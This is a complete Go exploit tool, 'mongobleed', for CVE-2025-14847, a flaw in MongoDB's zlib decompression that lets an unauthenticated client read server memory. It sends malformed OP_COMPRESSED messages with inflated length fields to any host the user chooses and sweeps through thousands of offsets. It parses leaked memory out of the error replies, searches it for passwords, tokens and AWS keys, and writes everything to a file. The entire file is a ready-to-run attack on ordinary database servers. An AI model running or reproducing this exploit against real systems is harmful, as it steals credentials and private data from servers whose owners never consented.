// mongobleed.go - CVE-2025-14847 MongoDB Unauthenticated Memory Leak Exploit
// Go implementation of the original Python tool by Joe Desimone
// Author: Go implementation
//
// Exploits zlib decompression bug to leak server memory via BSON field names.
// Technique: Craft BSON with inflated doc_len, server reads field names from
// leaked memory until null byte.

package main

import (
	"bytes"
	"compress/zlib"
	"encoding/binary"
	"flag"
	"fmt"
	"net"
	"os"
	"regexp"
	"strings"
	"time"
)

// sendProbe crafts and sends a malicious BSON document with inflated length
func sendProbe(host string, port int, docLen int32, bufferSize int32) ([]byte, error) {
	// Minimal BSON content - we lie about total length
	// \x10a\x00\x01\x00\x00\x00 = int32 a=1
	content := []byte{0x10, 'a', 0x00, 0x01, 0x00, 0x00, 0x00}
	
	// Create BSON with inflated document length
	bson := new(bytes.Buffer)
	binary.Write(bson, binary.LittleEndian, docLen) // Inflated length
	bson.Write(content)
	
	// Wrap in OP_MSG
	opMsg := new(bytes.Buffer)
	binary.Write(opMsg, binary.LittleEndian, uint32(0)) // messageLen (placeholder)
	opMsg.WriteByte(0x00)                               // flags
	opMsg.Write(bson.Bytes())
	
	// Compress the OP_MSG
	var compressed bytes.Buffer
	w := zlib.NewWriter(&compressed)
	w.Write(opMsg.Bytes())
	w.Close()
	
	// Build OP_COMPRESSED payload with inflated buffer size (triggers the bug)
	payload := new(bytes.Buffer)
	binary.Write(payload, binary.LittleEndian, uint32(2013))    // original opcode (OP_MSG)
	binary.Write(payload, binary.LittleEndian, bufferSize)      // claimed uncompressed size
	payload.WriteByte(0x02)                                     // compressor ID (zlib)
	payload.Write(compressed.Bytes())
	
	// Build MongoDB wire protocol header
	header := new(bytes.Buffer)
	binary.Write(header, binary.LittleEndian, uint32(16+payload.Len())) // messageLength
	binary.Write(header, binary.LittleEndian, uint32(1))                // requestID
	binary.Write(header, binary.LittleEndian, uint32(0))                // responseTo
	binary.Write(header, binary.LittleEndian, uint32(2012))             // opCode (OP_COMPRESSED)
	
	// Connect and send
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 2*time.Second)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	
	// Send the malicious payload
	_, err = conn.Write(append(header.Bytes(), payload.Bytes()...))
	if err != nil {
		return nil, err
	}
	
	// Read response
	response := make([]byte, 0)
	temp := make([]byte, 4096)
	
	for {
		conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		n, err := conn.Read(temp)
		if err != nil {
			break
		}
		response = append(response, temp[:n]...)
		
		// Check if we have a complete message
		if len(response) >= 4 {
			msgLen := binary.LittleEndian.Uint32(response[:4])
			if len(response) >= int(msgLen) {
				break
			}
		}
	}
	
	return response, nil
}

// extractLeaks extracts leaked data from MongoDB error responses
func extractLeaks(response []byte) [][]byte {
	if len(response) < 25 {
		return nil
	}
	
	var raw []byte
	msgLen := binary.LittleEndian.Uint32(response[:4])
	
	// Check if this is an OP_COMPRESSED response
	opCode := binary.LittleEndian.Uint32(response[12:16])
	if opCode == 2012 && len(response) >= 25 {
		// Decompress the response
		compressed := response[25:msgLen]
		decompressed, err := decompressZlib(compressed)
		if err != nil {
			return nil
		}
		raw = decompressed
	} else {
		raw = response[16:msgLen]
	}
	
	leaks := make([][]byte, 0)
	
	// Extract field names from BSON error messages
	fieldRegex := regexp.MustCompile(`field name '([^']*)'`)
	fieldMatches := fieldRegex.FindAllSubmatch(raw, -1)
	for _, match := range fieldMatches {
		if len(match) > 1 {
			data := match[1]
			// Filter out common false positives
			if len(data) > 0 && !isCommonField(data) {
				leaks = append(leaks, data)
			}
		}
	}
	
	// Extract type bytes from unrecognized type errors
	typeRegex := regexp.MustCompile(`type (\d+)`)
	typeMatches := typeRegex.FindAllSubmatch(raw, -1)
	for _, match := range typeMatches {
		if len(match) > 1 {
			var b byte
			fmt.Sscanf(string(match[1]), "%d", &b)
			leaks = append(leaks, []byte{b & 0xFF})
		}
	}
	
	return leaks
}

// decompressZlib decompresses zlib-compressed data
func decompressZlib(data []byte) ([]byte, error) {
	b := bytes.NewReader(data)
	r, err := zlib.NewReader(b)
	if err != nil {
		return nil, err
	}
	defer r.Close()
	
	var decompressed bytes.Buffer
	_, err = decompressed.ReadFrom(r)
	return decompressed.Bytes(), err
}

// isCommonField filters out common false positive field names
func isCommonField(data []byte) bool {
	commonFields := []string{"?", "a", "$db", "ping"}
	s := string(data)
	for _, field := range commonFields {
		if s == field {
			return true
		}
	}
	return false
}

// containsSecret checks if leaked data contains common secret patterns
func containsSecret(data []byte) []string {
	secrets := []string{"password", "secret", "key", "token", "admin", "AKIA"}
	found := make([]string, 0)
	
	lowerData := strings.ToLower(string(data))
	for _, secret := range secrets {
		if strings.Contains(lowerData, strings.ToLower(secret)) {
			found = append(found, secret)
		}
	}
	return found
}

func main() {
	// Command line arguments
	host := flag.String("host", "localhost", "Target MongoDB host")
	port := flag.Int("port", 27017, "Target MongoDB port")
	minOffset := flag.Int("min-offset", 20, "Minimum document length to probe")
	maxOffset := flag.Int("max-offset", 8192, "Maximum document length to probe")
	output := flag.String("output", "leaked.bin", "Output file for leaked data")
	flag.Parse()
	
	// Banner
	fmt.Println("[*] mongobleed - CVE-2025-14847 MongoDB Memory Leak")
	fmt.Println("[*] Author: Joe Desimone - x.com/dez_")
	fmt.Printf("[*] Target: %s:%d\n", *host, *port)
	fmt.Printf("[*] Scanning offsets %d-%d\n", *minOffset, *maxOffset)
	fmt.Println()
	
	// Scan for memory leaks
	allLeaked := make([]byte, 0)
	uniqueLeaks := make(map[string]bool)
	secretPatterns := make(map[string]bool)
	
	for docLen := int32(*minOffset); docLen <= int32(*maxOffset); docLen++ {
		response, err := sendProbe(*host, *port, docLen, docLen+500)
		if err != nil {
			continue
		}
		
		leaks := extractLeaks(response)
		for _, data := range leaks {
			dataStr := string(data)
			if !uniqueLeaks[dataStr] {
				uniqueLeaks[dataStr] = true
				allLeaked = append(allLeaked, data...)
				
				// Show interesting leaks (> 10 bytes)
				if len(data) > 10 {
					preview := string(data)
					if len(preview) > 80 {
						preview = preview[:80]
					}
					fmt.Printf("[+] offset=%4d len=%4d: %s\n", docLen, len(data), preview)
				}
				
				// Check for secrets
				secrets := containsSecret(data)
				for _, secret := range secrets {
					secretPatterns[secret] = true
				}
			}
		}
	}
	
	// Save results
	err := os.WriteFile(*output, allLeaked, 0644)
	if err != nil {
		fmt.Printf("[!] Error writing output file: %v\n", err)
	} else {
		fmt.Println()
		fmt.Printf("[*] Total leaked: %d bytes\n", len(allLeaked))
		fmt.Printf("[*] Unique fragments: %d\n", len(uniqueLeaks))
		fmt.Printf("[*] Saved to: %s\n", *output)
		
		// Display found secret patterns
		if len(secretPatterns) > 0 {
			fmt.Println()
			for secret := range secretPatterns {
				fmt.Printf("[!] Found pattern: %s\n", secret)
			}
		}
	}
}
